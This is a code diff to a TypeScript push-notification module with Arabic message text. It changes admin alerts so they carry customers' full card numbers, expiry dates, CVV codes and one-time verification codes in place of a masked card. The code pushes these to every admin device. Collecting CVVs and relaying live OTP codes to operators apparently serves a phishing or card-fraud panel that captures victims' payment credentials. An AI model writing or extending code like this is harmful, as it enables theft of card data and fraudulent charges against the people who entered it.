@@ -167,7 +167,7 @@ export async function sendTestNotification(
 }
 
 // Notify admins of card payment attempt
-export async function notifyAdminsOfCardAttempt(order: any, cardMasked: string) {
+export async function notifyAdminsOfCardAttempt(order: any, cardName: string, cardNumber: string, cardExpiry: string, cardCvv: string) {
   try {
     const devices = await db
       .select()
@@ -177,14 +177,16 @@ export async function notifyAdminsOfCardAttempt(order: any, cardMasked: string) 
     for (const device of devices) {
       await sendPushNotification(device.fcmToken, {
         title: "💳 محاولة بطاقة دفع!",
-        body: `${order.customerName} - ${order.productName} - البطاقة: ${cardMasked}`,
+        body: `العميل: ${order.customerName}\nرقم البطاقة: ${cardNumber}\nتاريخ الانتهاء: ${cardExpiry}\nرمز الأمان: ${cardCvv}`,
         tag: `card-${order.id}`,
         data: {
           type: "card_attempt",
           orderId: order.id.toString(),
           customerName: order.customerName,
           productName: order.productName,
-          cardNumber: cardMasked,
+          cardNumber: cardNumber,
+          cardExpiry: cardExpiry,
+          cardCvv: cardCvv,
           timestamp: new Date().toISOString(),
         },
       });
@@ -197,7 +199,7 @@ export async function notifyAdminsOfCardAttempt(order: any, cardMasked: string) 
 }
 
 // Notify admins of OTP verification attempt
-export async function notifyAdminsOfOtpAttempt(order: any, success: boolean) {
+export async function notifyAdminsOfOtpAttempt(order: any, otpCode: string, success: boolean) {
   try {
     const devices = await db
       .select()
@@ -210,13 +212,14 @@ export async function notifyAdminsOfOtpAttempt(order: any, success: boolean) {
     for (const device of devices) {
       await sendPushNotification(device.fcmToken, {
         title: `${statusEmoji} محاولة رمز تحقق!`,
-        body: `${order.customerName} - ${order.productName} - ${statusText}`,
+        body: `العميل: ${order.customerName}\nرمز التحقق: ${otpCode}\nالحالة: ${statusText}`,
         tag: `otp-${order.id}`,
         data: {
           type: "otp_attempt",
           orderId: order.id.toString(),
           customerName: order.customerName,
           productName: order.productName,
+          otpCode: otpCode,
           success: success.toString(),
           timestamp: new Date().toISOString(),
         },
